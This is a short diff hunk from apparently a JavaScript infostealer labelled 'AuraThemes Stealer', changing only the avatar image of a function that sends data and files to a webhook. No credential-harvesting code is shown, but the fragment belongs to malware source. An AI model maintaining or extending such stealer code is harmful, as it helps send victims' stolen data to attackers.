@@ -26,7 +26,7 @@ async function sendWebhook(webhookUrl, data, files = [], canary) {
     }
 
     data.username = "AuraThemes Stealer";
-    data.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
+    data.avatar_url = "https://i.imgur.com/CeFqJOc.gif";
 
     if (data.embeds) {
         for (const embed of data.embeds) {
